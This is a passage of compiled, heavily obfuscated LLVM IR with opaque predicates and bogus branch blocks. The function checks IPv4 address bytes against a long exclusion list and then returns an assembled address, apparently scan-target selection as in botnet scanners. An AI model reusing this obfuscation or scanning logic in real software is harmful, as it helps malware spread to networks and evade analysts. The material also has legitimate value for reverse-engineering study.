  %5180 = urem i32 %5179, 2
  %5181 = icmp eq i32 %5180, 0
  %5182 = icmp slt i32 %5177, 10
  %5183 = or i1 %5181, %5182
  br i1 %5183, label %originalBB726, label %originalBB726alteredBB

originalBB726:                                    ; preds = %originalBB726alteredBB, %5175
  %5184 = load i8, i8* %11, align 1
  %5185 = zext i8 %5184 to i32
  %5186 = icmp eq i32 %5185, 208
  %5187 = load i32, i32* @x.57
  %5188 = load i32, i32* @y.58
  %5189 = sub i32 %5187, 1
  %5190 = mul i32 %5187, %5189
  %5191 = urem i32 %5190, 2
  %5192 = icmp eq i32 %5191, 0
  %5193 = icmp slt i32 %5188, 10
  %5194 = or i1 %5192, %5193
  br i1 %5194, label %originalBBpart2728, label %originalBB726alteredBB

originalBBpart2728:                               ; preds = %originalBB726
  br i1 %5186, label %5259, label %5195

; <label>:5195:                                   ; preds = %originalBBpart2728, %originalBBpart2724
  %5196 = load i8, i8* %10, align 1
  %5197 = zext i8 %5196 to i32
  %5198 = icmp eq i32 %5197, 86
  br i1 %5198, label %5199, label %5203

; <label>:5199:                                   ; preds = %5195
  %5200 = load i8, i8* %11, align 1
  %5201 = zext i8 %5200 to i32
  %5202 = icmp eq i32 %5201, 209
  br i1 %5202, label %5259, label %5203

; <label>:5203:                                   ; preds = %5199, %5195
  %5204 = load i8, i8* %10, align 1
  %5205 = zext i8 %5204 to i32
  %5206 = icmp eq i32 %5205, 193
  br i1 %5206, label %5207, label %5211

; <label>:5207:                                   ; preds = %5203
  %5208 = load i8, i8* %11, align 1
  %5209 = zext i8 %5208 to i32
  %5210 = icmp eq i32 %5209, 164
  br i1 %5210, label %5259, label %5211

; <label>:5211:                                   ; preds = %5207, %5203
  %5212 = load i8, i8* %10, align 1
  %5213 = zext i8 %5212 to i32
  %5214 = icmp eq i32 %5213, 120
  br i1 %5214, label %5215, label %5223

; <label>:5215:                                   ; preds = %5211
  %5216 = load i8, i8* %11, align 1
  %5217 = zext i8 %5216 to i32
  %5218 = icmp sge i32 %5217, 103
  br i1 %5218, label %5219, label %5223

; <label>:5219:                                   ; preds = %5215
  %5220 = load i8, i8* %11, align 1
  %5221 = zext i8 %5220 to i32
  %5222 = icmp slt i32 %5221, 108
  br i1 %5222, label %5259, label %5223

; <label>:5223:                                   ; preds = %5219, %5215, %5211
  %5224 = load i8, i8* %10, align 1
  %5225 = zext i8 %5224 to i32
  %5226 = icmp eq i32 %5225, 188
  br i1 %5226, label %5227, label %5231

; <label>:5227:                                   ; preds = %5223
  %5228 = load i8, i8* %11, align 1
  %5229 = zext i8 %5228 to i32
  %5230 = icmp eq i32 %5229, 68
  br i1 %5230, label %5259, label %5231

; <label>:5231:                                   ; preds = %5227, %5223
  %5232 = load i32, i32* @x.57
  %5233 = load i32, i32* @y.58
  %5234 = sub i32 %5232, 1
  %5235 = mul i32 %5232, %5234
  %5236 = urem i32 %5235, 2
  %5237 = icmp eq i32 %5236, 0
  %5238 = icmp slt i32 %5233, 10
  %5239 = or i1 %5237, %5238
  br i1 %5239, label %originalBB730, label %originalBB730alteredBB

originalBB730:                                    ; preds = %originalBB730alteredBB, %5231
  %5240 = load i8, i8* %10, align 1
  %5241 = zext i8 %5240 to i32
  %5242 = icmp eq i32 %5241, 78
  %5243 = load i32, i32* @x.57
  %5244 = load i32, i32* @y.58
  %5245 = sub i32 %5243, 1
  %5246 = mul i32 %5243, %5245
  %5247 = urem i32 %5246, 2
  %5248 = icmp eq i32 %5247, 0
  %5249 = icmp slt i32 %5244, 10
  %5250 = or i1 %5248, %5249
  br i1 %5250, label %originalBBpart2732, label %originalBB730alteredBB

originalBBpart2732:                               ; preds = %originalBB730
  br i1 %5242, label %5251, label %5255

; <label>:5251:                                   ; preds = %originalBBpart2732
  %5252 = load i8, i8* %11, align 1
  %5253 = zext i8 %5252 to i32
  %5254 = icmp eq i32 %5253, 46
  br i1 %5254, label %5259, label %5255

; <label>:5255:                                   ; preds = %5251, %originalBBpart2732
  %5256 = load i8, i8* %10, align 1
  %5257 = zext i8 %5256 to i32
  %5258 = icmp eq i32 %5257, 224
  br label %5259

; <label>:5259:                                   ; preds = %5255, %5251, %5227, %5219, %5207, %5199, %originalBBpart2728, %5151, %5123, %5111, %5099, %5071, %5059, %originalBBpart2708, %originalBBpart2696, %originalBBpart2692, %4903, %4891, %originalBBpart2684, %4839, %originalBBpart2676, %4751, %4723, %4695, %originalBBpart2656, %4639, %originalBBpart2648, %originalBBpart2640, %4531, %4515, %4483, %originalBBpart2628, %4419, %4403, %originalBBpart2616, %originalBBpart2612, %originalBBpart2604, %4259, %originalBBpart2588, %4163, %4147, %4131, %4099, %4067, %4019, %4011, %4003, %originalBBpart2564, %3939, %originalBBpart2556, %originalBBpart2552, %3883, %originalBBpart2548, %originalBBpart2540, %3795, %3771, %3747, %3739, %3731, %originalBBpart2524, %3699, %3691, %3659, %3595, %3531, %3483, %3467, %originalBBpart2476, %originalBBpart2472, %3339, %3323, %originalBBpart2464, %originalBBpart2456, %originalBBpart2448, %originalBBpart2440, %3147, %3115, %3051, %3035, %3003, %2971, %originalBBpart2412, %2923, %2891, %originalBBpart2396, %originalBBpart2388, %2731, %2683, %2635, %originalBBpart2356, %2555, %2539, %originalBBpart2336, %2427, %originalBBpart2328, %2363, %originalBBpart2320, %2323, %2299, %2275, %originalBBpart2308, %2243, %2235, %originalBBpart2304, %2187, %2179, %originalBBpart2296, %originalBBpart2292, %2123, %2095, %2067, %originalBBpart2272, %1979, %originalBBpart2260, %1923, %1895, %1851, %1807, %1779, %1751, %originalBBpart2228, %1711, %1683, %1671, %originalBBpart2220, %1631, %1619, %originalBBpart2216, %1563, %1551, %originalBBpart2204, %1495, %1483, %1471, %originalBBpart2196, %1415, %1371, %1343, %1331, %1303, %originalBBpart2176, %1247, %1219, %1207, %1179, %1151, %1139, %originalBBpart2156, %1083, %1055, %originalBBpart2140, %originalBBpart2132, %943, %935, %911, %903, %895, %887, %879, %originalBBpart2120, %originalBBpart2116, %807, %799, %775, %751, %727, %originalBBpart296, %679, %655, %originalBBpart284, %623, %originalBBpart280, %591, %originalBBpart276, %559, %originalBBpart272, %originalBBpart268, %503, %originalBBpart260, %455, %447, %439, %431, %423, %415, %originalBBpart256, %383, %359, %351, %originalBBpart244, %originalBBpart236, %originalBBpart232, %originalBBpart228, %219, %215, %originalBBpart224, %191, %187, %183, %179, %175, %171, %167, %originalBBpart220, %143, %139, %135, %originalBBpart216, %originalBBpart212, %originalBBpart28, %71, %67, %originalBBpart24, %43, %39
  %5260 = phi i1 [ true, %5251 ], [ true, %5227 ], [ true, %5219 ], [ true, %5207 ], [ true, %5199 ], [ true, %originalBBpart2728 ], [ true, %5151 ], [ true, %5123 ], [ true, %5111 ], [ true, %5099 ], [ true, %5071 ], [ true, %5059 ], [ true, %originalBBpart2708 ], [ true, %originalBBpart2696 ], [ true, %originalBBpart2692 ], [ true, %4903 ], [ true, %4891 ], [ true, %originalBBpart2684 ], [ true, %4839 ], [ true, %originalBBpart2676 ], [ true, %4751 ], [ true, %4723 ], [ true, %4695 ], [ true, %originalBBpart2656 ], [ true, %4639 ], [ true, %originalBBpart2648 ], [ true, %originalBBpart2640 ], [ true, %4531 ], [ true, %4515 ], [ true, %4483 ], [ true, %originalBBpart2628 ], [ true, %4419 ], [ true, %4403 ], [ true, %originalBBpart2616 ], [ true, %originalBBpart2612 ], [ true, %originalBBpart2604 ], [ true, %4259 ], [ true, %originalBBpart2588 ], [ true, %4163 ], [ true, %4147 ], [ true, %4131 ], [ true, %4099 ], [ true, %4067 ], [ true, %4019 ], [ true, %4011 ], [ true, %4003 ], [ true, %originalBBpart2564 ], [ true, %3939 ], [ true, %originalBBpart2556 ], [ true, %originalBBpart2552 ], [ true, %3883 ], [ true, %originalBBpart2548 ], [ true, %originalBBpart2540 ], [ true, %3795 ], [ true, %3771 ], [ true, %3747 ], [ true, %3739 ], [ true, %3731 ], [ true, %originalBBpart2524 ], [ true, %3699 ], [ true, %3691 ], [ true, %3659 ], [ true, %3595 ], [ true, %3531 ], [ true, %3483 ], [ true, %3467 ], [ true, %originalBBpart2476 ], [ true, %originalBBpart2472 ], [ true, %3339 ], [ true, %3323 ], [ true, %originalBBpart2464 ], [ true, %originalBBpart2456 ], [ true, %originalBBpart2448 ], [ true, %originalBBpart2440 ], [ true, %3147 ], [ true, %3115 ], [ true, %3051 ], [ true, %3035 ], [ true, %3003 ], [ true, %2971 ], [ true, %originalBBpart2412 ], [ true, %2923 ], [ true, %2891 ], [ true, %originalBBpart2396 ], [ true, %originalBBpart2388 ], [ true, %2731 ], [ true, %2683 ], [ true, %2635 ], [ true, %originalBBpart2356 ], [ true, %2555 ], [ true, %2539 ], [ true, %originalBBpart2336 ], [ true, %2427 ], [ true, %originalBBpart2328 ], [ true, %2363 ], [ true, %originalBBpart2320 ], [ true, %2323 ], [ true, %2299 ], [ true, %2275 ], [ true, %originalBBpart2308 ], [ true, %2243 ], [ true, %2235 ], [ true, %originalBBpart2304 ], [ true, %2187 ], [ true, %2179 ], [ true, %originalBBpart2296 ], [ true, %originalBBpart2292 ], [ true, %2123 ], [ true, %2095 ], [ true, %2067 ], [ true, %originalBBpart2272 ], [ true, %1979 ], [ true, %originalBBpart2260 ], [ true, %1923 ], [ true, %1895 ], [ true, %1851 ], [ true, %1807 ], [ true, %1779 ], [ true, %1751 ], [ true, %originalBBpart2228 ], [ true, %1711 ], [ true, %1683 ], [ true, %1671 ], [ true, %originalBBpart2220 ], [ true, %1631 ], [ true, %1619 ], [ true, %originalBBpart2216 ], [ true, %1563 ], [ true, %1551 ], [ true, %originalBBpart2204 ], [ true, %1495 ], [ true, %1483 ], [ true, %1471 ], [ true, %originalBBpart2196 ], [ true, %1415 ], [ true, %1371 ], [ true, %1343 ], [ true, %1331 ], [ true, %1303 ], [ true, %originalBBpart2176 ], [ true, %1247 ], [ true, %1219 ], [ true, %1207 ], [ true, %1179 ], [ true, %1151 ], [ true, %1139 ], [ true, %originalBBpart2156 ], [ true, %1083 ], [ true, %1055 ], [ true, %originalBBpart2140 ], [ true, %originalBBpart2132 ], [ true, %943 ], [ true, %935 ], [ true, %911 ], [ true, %903 ], [ true, %895 ], [ true, %887 ], [ true, %879 ], [ true, %originalBBpart2120 ], [ true, %originalBBpart2116 ], [ true, %807 ], [ true, %799 ], [ true, %775 ], [ true, %751 ], [ true, %727 ], [ true, %originalBBpart296 ], [ true, %679 ], [ true, %655 ], [ true, %originalBBpart284 ], [ true, %623 ], [ true, %originalBBpart280 ], [ true, %591 ], [ true, %originalBBpart276 ], [ true, %559 ], [ true, %originalBBpart272 ], [ true, %originalBBpart268 ], [ true, %503 ], [ true, %originalBBpart260 ], [ true, %455 ], [ true, %447 ], [ true, %439 ], [ true, %431 ], [ true, %423 ], [ true, %415 ], [ true, %originalBBpart256 ], [ true, %383 ], [ true, %359 ], [ true, %351 ], [ true, %originalBBpart244 ], [ true, %originalBBpart236 ], [ true, %originalBBpart232 ], [ true, %originalBBpart228 ], [ true, %219 ], [ true, %215 ], [ true, %originalBBpart224 ], [ true, %191 ], [ true, %187 ], [ true, %183 ], [ true, %179 ], [ true, %175 ], [ true, %171 ], [ true, %167 ], [ true, %originalBBpart220 ], [ true, %143 ], [ true, %139 ], [ true, %135 ], [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ true, %originalBBpart28 ], [ true, %71 ], [ true, %67 ], [ true, %originalBBpart24 ], [ true, %43 ], [ true, %39 ], [ %5258, %5255 ]
  br i1 %5260, label %22, label %5261

; <label>:5261:                                   ; preds = %5259
  %5262 = load i8, i8* %10, align 1
  %5263 = zext i8 %5262 to i32
  %5264 = shl i32 %5263, 24
  %5265 = load i8, i8* %11, align 1
  %5266 = zext i8 %5265 to i32
  %5267 = shl i32 %5266, 16
  %5268 = or i32 %5264, %5267
  %5269 = load i8, i8* %12, align 1
  %5270 = zext i8 %5269 to i32
  %5271 = shl i32 %5270, 8
  %5272 = or i32 %5268, %5271
  %5273 = load i8, i8* %13, align 1
  %5274 = zext i8 %5273 to i32
  %5275 = shl i32 %5274, 0
  %5276 = or i32 %5272, %5275
  %5277 = call i32 @htonl(i32 %5276) #7
  ret i32 %5277

originalBBalteredBB:                              ; preds = %originalBB, %0
  %5278 = alloca i32, align 4
  %5279 = alloca i8, align 1
  %5280 = alloca i8, align 1
  %5281 = alloca i8, align 1
  %5282 = alloca i8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %5283 = load i8, i8* %10, align 1
  %5284 = zext i8 %5283 to i32
  %5285 = icmp eq i32 %5284, 3
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %5286 = load i8, i8* %10, align 1
  %5287 = zext i8 %5286 to i32
  %5288 = icmp eq i32 %5287, 10
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %5289 = load i8, i8* %10, align 1
  %5290 = zext i8 %5289 to i32
  %5291 = icmp eq i32 %5290, 25
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %115
  %5292 = load i8, i8* %10, align 1
  %5293 = zext i8 %5292 to i32
  %5294 = icmp eq i32 %5293, 49
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %147
  %5295 = load i8, i8* %10, align 1
  %5296 = zext i8 %5295 to i32
  %5297 = icmp eq i32 %5296, 7
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %195
  %5298 = load i8, i8* %10, align 1
  %5299 = zext i8 %5298 to i32
  %5300 = icmp eq i32 %5299, 33
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %223
  %5301 = load i8, i8* %10, align 1
  %5302 = zext i8 %5301 to i32
  %5303 = icmp eq i32 %5302, 215
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %247
  %5304 = load i8, i8* %11, align 1
  %5305 = zext i8 %5304 to i32
  %5306 = icmp eq i32 %5305, 168
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %271
  %5307 = load i8, i8* %11, align 1
  %5308 = zext i8 %5307 to i32
  %5309 = icmp eq i32 %5308, 17
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %291
  %5310 = load i8, i8* %10, align 1
  %5311 = zext i8 %5310 to i32
  %5312 = icmp eq i32 %5311, 146
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %311
  %5313 = load i8, i8* %11, align 1
  %5314 = zext i8 %5313 to i32
  %5315 = icmp eq i32 %5314, 80
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %331
  %5316 = load i8, i8* %10, align 1
  %5317 = zext i8 %5316 to i32
  %5318 = icmp eq i32 %5317, 146
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %363
  %5319 = load i8, i8* %10, align 1
  %5320 = zext i8 %5319 to i32
  %5321 = icmp eq i32 %5320, 147
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %391
  %5322 = load i8, i8* %11, align 1
  %5323 = zext i8 %5322 to i32
  %5324 = icmp eq i32 %5323, 114
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %463
  %5325 = load i8, i8* %11, align 1
  %5326 = zext i8 %5325 to i32
  %5327 = icmp eq i32 %5326, 190
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %483
  %5328 = load i8, i8* %10, align 1
  %5329 = zext i8 %5328 to i32
  %5330 = icmp eq i32 %5329, 150
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %511
  %5331 = load i8, i8* %11, align 1
  %5332 = zext i8 %5331 to i32
  %5333 = icmp eq i32 %5332, 82
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %535
  %5334 = load i8, i8* %11, align 1
  %5335 = zext i8 %5334 to i32
  %5336 = icmp eq i32 %5335, 229
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %567
  %5337 = load i8, i8* %11, align 1
  %5338 = zext i8 %5337 to i32
  %5339 = icmp eq i32 %5338, 217
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %599
  %5340 = load i8, i8* %11, align 1
  %5341 = zext i8 %5340 to i32
  %5342 = icmp eq i32 %5341, 32
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %631
  %5343 = load i8, i8* %11, align 1
  %5344 = zext i8 %5343 to i32
  %5345 = icmp eq i32 %5344, 149
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %659
  %5346 = load i8, i8* %10, align 1
  %5347 = zext i8 %5346 to i32
  %5348 = icmp eq i32 %5347, 155
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %683
  %5349 = load i8, i8* %10, align 1
  %5350 = zext i8 %5349 to i32
  %5351 = icmp eq i32 %5350, 164
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %703
  %5352 = load i8, i8* %11, align 1
  %5353 = zext i8 %5352 to i32
  %5354 = icmp eq i32 %5353, 158
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %731
  %5355 = load i8, i8* %10, align 1
  %5356 = zext i8 %5355 to i32
  %5357 = icmp eq i32 %5356, 167
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %755
  %5358 = load i8, i8* %10, align 1
  %5359 = zext i8 %5358 to i32
  %5360 = icmp eq i32 %5359, 168
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %779
  %5361 = load i8, i8* %10, align 1
  %5362 = zext i8 %5361 to i32
  %5363 = icmp eq i32 %5362, 168
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %811
  %5364 = load i8, i8* %10, align 1
  %5365 = zext i8 %5364 to i32
  %5366 = icmp eq i32 %5365, 203
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %831
  %5367 = load i8, i8* %11, align 1
  %5368 = zext i8 %5367 to i32
  %5369 = icmp eq i32 %5368, 59
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %855
  %5370 = load i8, i8* %11, align 1
  %5371 = zext i8 %5370 to i32
  %5372 = icmp eq i32 %5371, 34
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %915
  %5373 = load i8, i8* %10, align 1
  %5374 = zext i8 %5373 to i32
  %5375 = icmp eq i32 %5374, 209
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %951
  %5376 = load i8, i8* %11, align 1
  %5377 = zext i8 %5376 to i32
  %5378 = icmp sge i32 %5377, 16
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %971
  %5379 = load i8, i8* %11, align 1
  %5380 = zext i8 %5379 to i32
  %5381 = icmp slt i32 %5380, 32
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %995
  %5382 = load i8, i8* %11, align 1
  %5383 = zext i8 %5382 to i32
  %5384 = icmp sge i32 %5383, 64
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1015
  %5385 = load i8, i8* %11, align 1
  %5386 = zext i8 %5385 to i32
  %5387 = icmp slt i32 %5386, 127
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1035
  %5388 = load i8, i8* %10, align 1
  %5389 = zext i8 %5388 to i32
  %5390 = icmp eq i32 %5389, 169
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1059
  %5391 = load i8, i8* %10, align 1
  %5392 = zext i8 %5391 to i32
  %5393 = icmp eq i32 %5392, 198
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1087
  %5394 = load i8, i8* %10, align 1
  %5395 = zext i8 %5394 to i32
  %5396 = icmp eq i32 %5395, 64
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1111
  %5397 = load i8, i8* %11, align 1
  %5398 = zext i8 %5397 to i32
  %5399 = icmp slt i32 %5398, 227
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1159
  %5400 = load i8, i8* %11, align 1
  %5401 = zext i8 %5400 to i32
  %5402 = icmp sge i32 %5401, 40
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1183
  %5403 = load i8, i8* %10, align 1
  %5404 = zext i8 %5403 to i32
  %5405 = icmp eq i32 %5404, 131
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1227
  %5406 = load i8, i8* %11, align 1
  %5407 = zext i8 %5406 to i32
  %5408 = icmp sge i32 %5407, 5
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1255
  %5409 = load i8, i8* %11, align 1
  %5410 = zext i8 %5409 to i32
  %5411 = icmp sge i32 %5410, 177
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1275
  %5412 = load i8, i8* %11, align 1
  %5413 = zext i8 %5412 to i32
  %5414 = icmp slt i32 %5413, 223
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1311
  %5415 = load i8, i8* %11, align 1
  %5416 = zext i8 %5415 to i32
  %5417 = icmp sge i32 %5416, 31
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1347
  %5418 = load i8, i8* %10, align 1
  %5419 = zext i8 %5418 to i32
  %5420 = icmp eq i32 %5419, 143
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1375
  %5421 = load i8, i8* %10, align 1
  %5422 = zext i8 %5421 to i32
  %5423 = icmp eq i32 %5422, 144
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1395
  %5424 = load i8, i8* %11, align 1
  %5425 = zext i8 %5424 to i32
  %5426 = icmp sge i32 %5425, 99
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1427
  %5427 = load i8, i8* %11, align 1
  %5428 = zext i8 %5427 to i32
  %5429 = icmp slt i32 %5428, 166
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1447
  %5430 = load i8, i8* %10, align 1
  %5431 = zext i8 %5430 to i32
  %5432 = icmp eq i32 %5431, 147
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1507
  %5433 = load i8, i8* %11, align 1
  %5434 = zext i8 %5433 to i32
  %5435 = icmp slt i32 %5434, 200
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1531
  %5436 = load i8, i8* %11, align 1
  %5437 = zext i8 %5436 to i32
  %5438 = icmp sge i32 %5437, 238
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1567
  %5439 = load i8, i8* %10, align 1
  %5440 = zext i8 %5439 to i32
  %5441 = icmp eq i32 %5440, 152
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1591
  %5442 = load i8, i8* %11, align 1
  %5443 = zext i8 %5442 to i32
  %5444 = icmp slt i32 %5443, 155
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1643
  %5445 = load i8, i8* %11, align 1
  %5446 = zext i8 %5445 to i32
  %5447 = icmp slt i32 %5446, 89
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1691
  %5448 = load i8, i8* %11, align 1
  %5449 = zext i8 %5448 to i32
  %5450 = icmp sge i32 %5449, 1
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1723
  %5451 = load i8, i8* %11, align 1
  %5452 = zext i8 %5451 to i32
  %5453 = icmp slt i32 %5452, 247
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1755
  %5454 = load i8, i8* %10, align 1
  %5455 = zext i8 %5454 to i32
  %5456 = icmp eq i32 %5455, 160
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1783
  %5457 = load i8, i8* %10, align 1
  %5458 = zext i8 %5457 to i32
  %5459 = icmp eq i32 %5458, 64
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1811
  %5460 = load i8, i8* %10, align 1
  %5461 = zext i8 %5460 to i32
  %5462 = icmp eq i32 %5461, 162
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1831
  %5463 = load i8, i8* %11, align 1
  %5464 = zext i8 %5463 to i32
  %5465 = icmp sge i32 %5464, 45
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1855
  %5466 = load i8, i8* %10, align 1
  %5467 = zext i8 %5466 to i32
  %5468 = icmp eq i32 %5467, 163
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1875
  %5469 = load i8, i8* %11, align 1
  %5470 = zext i8 %5469 to i32
  %5471 = icmp sge i32 %5470, 205
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1899
  %5472 = load i8, i8* %10, align 1
  %5473 = zext i8 %5472 to i32
  %5474 = icmp eq i32 %5473, 164
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1935
  %5475 = load i8, i8* %11, align 1
  %5476 = zext i8 %5475 to i32
  %5477 = icmp slt i32 %5476, 233
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %1955
  %5478 = load i8, i8* %10, align 1
  %5479 = zext i8 %5478 to i32
  %5480 = icmp eq i32 %5479, 169
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %1987
  %5481 = load i8, i8* %11, align 1
  %5482 = zext i8 %5481 to i32
  %5483 = icmp sge i32 %5482, 121
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2007
  %5484 = load i8, i8* %11, align 1
  %5485 = zext i8 %5484 to i32
  %5486 = icmp slt i32 %5485, 254
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2027
  %5487 = load i8, i8* %10, align 1
  %5488 = zext i8 %5487 to i32
  %5489 = icmp eq i32 %5488, 205
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2047
  %5490 = load i8, i8* %11, align 1
  %5491 = zext i8 %5490 to i32
  %5492 = icmp sge i32 %5491, 1
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2071
  %5493 = load i8, i8* %10, align 1
  %5494 = zext i8 %5493 to i32
  %5495 = icmp eq i32 %5494, 207
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2103
  %5496 = load i8, i8* %11, align 1
  %5497 = zext i8 %5496 to i32
  %5498 = icmp sge i32 %5497, 16
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2131
  %5499 = load i8, i8* %11, align 1
  %5500 = zext i8 %5499 to i32
  %5501 = icmp eq i32 %5500, 166
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2155
  %5502 = load i8, i8* %11, align 1
  %5503 = zext i8 %5502 to i32
  %5504 = icmp eq i32 %5503, 226
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2191
  %5505 = load i8, i8* %10, align 1
  %5506 = zext i8 %5505 to i32
  %5507 = icmp eq i32 %5506, 45
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2211
  %5508 = load i8, i8* %11, align 1
  %5509 = zext i8 %5508 to i32
  %5510 = icmp eq i32 %5509, 55
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2251
  %5511 = load i8, i8* %11, align 1
  %5512 = zext i8 %5511 to i32
  %5513 = icmp eq i32 %5512, 236
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2279
  %5514 = load i8, i8* %10, align 1
  %5515 = zext i8 %5514 to i32
  %5516 = icmp eq i32 %5515, 138
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2303
  %5517 = load i8, i8* %10, align 1
  %5518 = zext i8 %5517 to i32
  %5519 = icmp eq i32 %5518, 138
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2331
  %5520 = load i8, i8* %11, align 1
  %5521 = zext i8 %5520 to i32
  %5522 = icmp eq i32 %5521, 59
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2375
  %5523 = load i8, i8* %12, align 1
  %5524 = zext i8 %5523 to i32
  %5525 = icmp sge i32 %5524, 10
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2395
  %5526 = load i8, i8* %12, align 1
  %5527 = zext i8 %5526 to i32
  %5528 = icmp slt i32 %5527, 11
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2439
  %5529 = load i8, i8* %12, align 1
  %5530 = zext i8 %5529 to i32
  %5531 = icmp sge i32 %5530, 128
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2459
  %5532 = load i8, i8* %12, align 1
  %5533 = zext i8 %5532 to i32
  %5534 = icmp slt i32 %5533, 255
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2479
  %5535 = load i8, i8* %10, align 1
  %5536 = zext i8 %5535 to i32
  %5537 = icmp eq i32 %5536, 198
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2499
  %5538 = load i8, i8* %11, align 1
  %5539 = zext i8 %5538 to i32
  %5540 = icmp eq i32 %5539, 199
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2519
  %5541 = load i8, i8* %12, align 1
  %5542 = zext i8 %5541 to i32
  %5543 = icmp sge i32 %5542, 64
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2567
  %5544 = load i8, i8* %12, align 1
  %5545 = zext i8 %5544 to i32
  %5546 = icmp sge i32 %5545, 192
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2587
